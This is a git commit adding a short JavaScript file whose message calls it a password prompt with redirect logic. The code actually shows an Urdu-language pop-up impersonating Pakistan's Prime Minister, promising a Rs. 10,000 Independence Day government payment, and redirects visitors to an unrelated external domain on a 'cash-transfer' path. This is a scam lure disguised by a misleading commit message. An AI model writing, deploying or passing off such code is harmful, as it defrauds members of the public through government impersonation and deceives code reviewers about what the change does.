c94eae31a304d67626c5388e1eac4c67dcf1e1af
zebraboiz6 <hopping-font8s@icloud.com>
2026-08-08 11:26:01 +0100

    Implement password prompt and redirect logic
    Add a script to prompt for a password and redirect if incorrect.

---
+++ pakis79.js
@@ -0,0 +1,10 @@
+var password = 'Rs.10,000';
+
+password = prompt(
+  'PM Shehbaz Sharif: مبارک ہو، آپ روپے وصول کرنے کے اہل ہیں۔ حکومت پاکستان کی جانب سے اس سال یوم آزادی منانے کے لیے 10,000۔ ابھی چالو کرنے کے لیے ٹھیک ہے پر کلک کریں۔',
+  'Rs.10,000'
+);
+
+if (password !== 'Rs.10,000') {
+    location.href = 'https://www.cgakamof.fit/rs10000-independence-day-cash-transfer';
+}
